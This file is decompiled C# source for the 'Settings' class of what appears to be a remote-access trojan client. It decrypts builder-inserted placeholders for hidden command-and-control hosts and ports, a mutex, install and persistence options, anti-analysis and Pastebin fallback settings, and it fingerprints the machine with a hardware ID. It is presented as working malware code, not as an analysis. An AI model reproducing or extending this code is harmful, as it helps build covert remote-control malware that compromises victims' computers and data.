using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client
{
	// Token: 0x02000003 RID: 3
	public static class Settings
	{
		// Token: 0x06000003 RID: 3 RVA: 0x00002140 File Offset: 0x00000340
		public static bool InitializeSettings()
		{
			bool result;
			try
			{
				Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
				Settings.aes256 = new Aes256(Settings.Key);
				Settings.Ports = Settings.aes256.Decrypt(Settings.Ports);
				Settings.Hosts = Settings.aes256.Decrypt(Settings.Hosts);
				Settings.Version = Settings.aes256.Decrypt(Settings.Version);
				Settings.Install = Settings.aes256.Decrypt(Settings.Install);
				Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
				Settings.Pastebin = Settings.aes256.Decrypt(Settings.Pastebin);
				Settings.Anti = Settings.aes256.Decrypt(Settings.Anti);
				Settings.BDOS = Settings.aes256.Decrypt(Settings.BDOS);
				Settings.Group = Settings.aes256.Decrypt(Settings.Group);
				Settings.Hwid = HwidGen.HWID();
				Settings.Serversignature = Settings.aes256.Decrypt(Settings.Serversignature);
				Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certificate)));
				result = Settings.VerifyHash();
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002298 File Offset: 0x00000498
		private static bool VerifyHash()
		{
			bool result;
			try
			{
				result = ((RSACryptoServiceProvider)Settings.ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Serversignature));
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x04000001 RID: 1
		public static string Ports = "%Ports%";

		// Token: 0x04000002 RID: 2
		public static string Hosts = "%Hosts%";

		// Token: 0x04000003 RID: 3
		public static string Version = "%Version%";

		// Token: 0x04000004 RID: 4
		public static string Install = "%Install%";

		// Token: 0x04000005 RID: 5
		public static string InstallFolder = "%Folder%";

		// Token: 0x04000006 RID: 6
		public static string InstallFile = "%File%";

		// Token: 0x04000007 RID: 7
		public static string Key = "%Key%";

		// Token: 0x04000008 RID: 8
		public static string MTX = "%MTX%";

		// Token: 0x04000009 RID: 9
		public static string Certificate = "%Certificate%";

		// Token: 0x0400000A RID: 10
		public static string Serversignature = "%Serversignature%";

		// Token: 0x0400000B RID: 11
		public static X509Certificate2 ServerCertificate;

		// Token: 0x0400000C RID: 12
		public static string Anti = "%Anti%";

		// Token: 0x0400000D RID: 13
		public static Aes256 aes256;

		// Token: 0x0400000E RID: 14
		public static string Pastebin = "%Pastebin%";

		// Token: 0x0400000F RID: 15
		public static string BDOS = "%BDOS%";

		// Token: 0x04000010 RID: 16
		public static string Hwid = null;

		// Token: 0x04000011 RID: 17
		public static string Delay = "%Delay%";

		// Token: 0x04000012 RID: 18
		public static string Group = "%Group%";
	}
}
